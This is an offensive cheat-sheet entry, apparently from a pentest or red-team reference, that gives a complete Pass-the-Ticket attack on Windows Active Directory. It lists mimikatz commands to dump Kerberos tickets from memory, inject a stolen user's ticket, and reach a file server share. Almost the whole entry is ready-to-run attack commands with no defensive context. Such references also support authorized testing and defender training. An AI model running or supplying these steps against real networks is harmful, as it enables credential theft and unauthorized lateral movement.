---
title: Pass-the-Ticket
category: ad
subcategory: ad-attacks
os: windows
command: kerberos::ptt ticket.kirbi
tools: mimikatz
---


Inject existing Kerberos tickets from memory into your session. No admin rights are required if the ticket belongs to the current user.

### Step 1 - Export tickets from memory

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

### Step 2 - Browse exported `.kirbi` files

```powershell
dir *.kirbi
```

### Step 3 - Inject the chosen ticket

```
mimikatz # kerberos::ptt [0;3ef465]-0-0-40810000-robert@cifs-FILE-SRV01.kirbi
```

### Step 4 - Verify and use

```powershell
klist
ls \\FILE-SRV01\projects
```
